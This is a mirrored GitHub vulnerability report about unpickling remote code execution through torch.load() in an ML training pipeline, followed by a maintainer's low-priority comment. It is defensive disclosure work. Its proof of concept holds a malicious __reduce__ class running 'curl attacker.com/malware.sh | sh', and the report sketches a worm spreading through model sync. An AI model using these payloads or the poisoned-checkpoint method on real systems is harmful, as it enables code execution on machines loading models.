---
title: "#863 — Potential RCE via `torch.load()` in ML Training Pipeline"
source: https://github.com/gonka-ai/gonka/issues/863
issue_number: 863
synced_at: 2026-07-30T20:39:26Z
template: issues-main.html
---

<div class="issues-detail-header">
  <h1 class="issues-detail-title">
    <span class="issues-status issues-status-closed"><svg viewBox="0 0 16 16"><path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"/></svg></span>
    Potential RCE via `torch.load()` in ML Training Pipeline
    <span class="issues-number">#863</span>
  </h1>
  <div class="issues-detail-meta">
    <span class="issues-meta-item">Closed</span>
    <span class="issues-meta-item"><a href="https://github.com/VVSMEN">@VVSMEN</a> opened 2026-03-05 10:44 UTC</span>
    <span class="issues-meta-item">1 comment</span>
    <span class="issues-meta-item">Updated 2026-03-12 20:25 UTC</span>
  </div>
  <div class="issues-labels" style="margin-top: 8px;"><span class="issues-label" style="background-color: #95b500; color: #24292f; border-color: #95b500;">Priority: Low</span></div>
</div>

<div class="issues-content" markdown="1">
#### Summary
This report describes a **potential unsafe deserialization issue** identified during **static/code review**. It has **not been verified on testnet**.  
The function `torch.load()` is used to load saved weights and training states without any protection mechanisms, which theoretically allows an attacker to inject and execute arbitrary code when loading model files. This vector could be exploited to create a "Dormant + Trigger" worm that silently infects network nodes and later paralyzes the network on command.  
**This matches the class of issues addressed by [PyTorch security advisory GHSA-53q9-r3pm-6pq6 (CVE-2025-32434)](https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6).**

**Risk Level:** Medium (theoretical, requires verification on testnet)  
**Affected Components:** `mlnode/packages/train/src/zeroband/monitor/checkpoint.py`, `mlnode/packages/train/src/zeroband/monitor/eval.py`

---

#### Technical Details

##### Where is `torch.load()` used?
A grep search revealed the following occurrences:
- `checkpoint.py` lines 301, 308, 336 – loading dataloader state, rank state, and main checkpoint.
- `eval.py` line 62 – loading model weights for validation.

Code snippet (`eval.py`, line 62):
```python
model.load_state_dict(torch.load(f)["model_state_dict"])
```

##### Vulnerability Mechanism
By default, `torch.load()` uses the `pickle` module, which can execute arbitrary code via the `__reduce__()` method. An attacker can craft a malicious `.pt` file that, when loaded, runs a system command.

**Proof of Concept (not executed on testnet):**
```python
import torch
import os

class Evil:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/malware.sh | sh',))

torch.save(Evil(), 'fake_model.pt')
# torch.load('fake_model.pt') → code executes
```

##### Potential Attack Scenario on Gonka Network
1. **Infection:** Attacker sends a poisoned checkpoint to a node, disguised as a legitimate model.
2. **Stealth Propagation:** The payload does not act immediately; instead, it adds itself to autostart, remains in memory, and returns correct weights to avoid detection.
3. **Mass Infection:** Through P2P gradient/model synchronization, the worm spreads to other nodes.
4. **Coordinated Attack:** At a predetermined time (or via command), all infected nodes simultaneously halt training, send garbage gradients, and deny service.

**Result:** The entire network is paralyzed, and the attack source is difficult to trace from logs.

##### Lack of Protection
The `weights_only=True` flag **is not used** in any `torch.load()` call. A grep for `weights_only` returned no results.

---

#### Compatibility Check
Analysis of the saving functions (`torch.save`) shows that only dictionaries and tensors are persisted – structures fully compatible with `weights_only=True`. Adding the flag will not break existing functionality.

**Evidence** (`checkpoint.py`, lines 250–260, inside `_save()` method): the checkpoint is written to `path / "checkpoint.pth"` with:
```python
checkpoint = {
    "model_state_dict": model_state_dict,
    "optimizer_state_dict": self.optimizer.state_dict(),
    "scheduler_state_dict": self.scheduler.state_dict(),
    "training_progress": self.training_progress.state_dict(),
}
torch.save(checkpoint, path / "checkpoint.pth")
```
All items are dictionaries/tensors.

---

#### Local Testing of the Mitigation
In an isolated Docker container, the effectiveness of `weights_only=True` was verified:

**Without protection:**
```bash
docker run --rm pytorch/pytorch:latest python3 -c "
import torch, os
class Evil:
    def __reduce__(self):
        return (os.system, ('echo EXPLOITED',))
torch.save(Evil(), 'bomb.pt')
torch.load('bomb.pt')  # → EXPLOITED
"
```
**Result:** Command executed (RCE confirmed).

**With protection:**
```bash
docker run --rm pytorch/pytorch:latest python3 -c "
import torch, os
class Evil:
    def __reduce__(self):
        return (os.system, ('echo EXPLOITED',))
torch.save(Evil(), 'bomb.pt')
try:
    torch.load('bomb.pt', weights_only=True)
except Exception as e:
    print(f'[PROTECTED] {e}')
"
```
**Result:** `[PROTECTED] WeightsUnpickler error: Unsupported class posix.system`  
The command **did not execute**. The flag successfully blocked code execution.

---

#### Recommended Fix
Add `weights_only=True` to all `torch.load()` calls in the affected files.  
If other arguments like `map_location` are present, they can be combined, e.g.:
```python
torch.load(f, weights_only=True, map_location="cpu")
```

**Example change:**
```diff
# checkpoint.py
- torch.load(f)
+ torch.load(f, weights_only=True)

# eval.py
- torch.load(f)
+ torch.load(f, weights_only=True)
```

You can apply the change automatically with `sed`. Note the difference between Linux and macOS:

**For Linux:**
```bash
sed -i 's/torch\.load(f)/torch.load(f, weights_only=True)/g' mlnode/packages/train/src/zeroband/monitor/checkpoint.py
sed -i 's/torch\.load(f)/torch.load(f, weights_only=True)/g' mlnode/packages/train/src/zeroband/monitor/eval.py
```

**For macOS:**
```bash
sed -i '' 's/torch\.load(f)/torch.load(f, weights_only=True)/g' mlnode/packages/train/src/zeroband/monitor/checkpoint.py
sed -i '' 's/torch\.load(f)/torch.load(f, weights_only=True)/g' mlnode/packages/train/src/zeroband/monitor/eval.py
```

---

#### Status
The vulnerability is identified at the code level, **not verified on testnet**. It requires validation and, if confirmed, a preventive patch.

---

#### References
- [PyTorch torch.load documentation](https://pytorch.org/docs/stable/generated/torch.load.html)
- [CVE-2025-32434 / GHSA-53q9-r3pm-6pq6](https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6)
- [Pickle security risks](https://docs.python.org/3/library/pickle.html#what-can-pickle-do)
</div>

---

## 💬 Comments (1)

<div class="issues-comment">
  <div class="issues-comment-header">
    <span><a href="https://github.com/tamazgadaev">@tamazgadaev</a></span>
    <span class="issues-meta-item">commented 2026-03-12 19:44 UTC</span>
  </div>
  <div class="issues-comment-body issues-content">
    <p>Training is not currently supported and basically needs total revision, so I'd say this issue is low-priority</p>
  </div>
</div>

---

> 🔄 **Auto-synced** from [Issue #863](https://github.com/gonka-ai/gonka/issues/863) every hour.
